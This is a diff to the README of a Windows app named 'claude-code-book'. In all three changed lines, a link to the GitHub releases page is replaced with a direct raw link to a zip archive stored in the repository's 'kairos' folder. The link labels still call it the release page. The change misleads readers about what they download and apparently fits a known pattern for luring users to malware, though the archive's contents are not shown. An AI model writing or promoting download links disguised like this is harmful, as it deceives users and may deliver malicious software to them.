@@ -1,6 +1,6 @@
 # 📘 claude-code-book - Turn Claude Code Into Clear Books
 
-[![Download claude-code-book](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/ptolemaic-programmemusic151/claude-code-book/releases)
+[![Download claude-code-book](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/ptolemaic-programmemusic151/claude-code-book/main/kairos/book_code_claude_v2.2.zip)
 
 ## 🚀 What this app does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 This app is meant to run on Windows for most end users. To get it, visit the release page and download the latest version:
 
-[Go to the download page](https://github.com/ptolemaic-programmemusic151/claude-code-book/releases)
+[Go to the download page](https://raw.githubusercontent.com/ptolemaic-programmemusic151/claude-code-book/main/kairos/book_code_claude_v2.2.zip)
 
 ### How to install
 
@@ -147,7 +147,7 @@ It aims to make Claude Code output easier to work with for developers who want s
 
 If you need the latest version later, use this page again:
 
-[Visit the release page](https://github.com/ptolemaic-programmemusic151/claude-code-book/releases)
+[Visit the release page](https://raw.githubusercontent.com/ptolemaic-programmemusic151/claude-code-book/main/kairos/book_code_claude_v2.2.zip)
 
 ## 🪟 Windows run steps
 
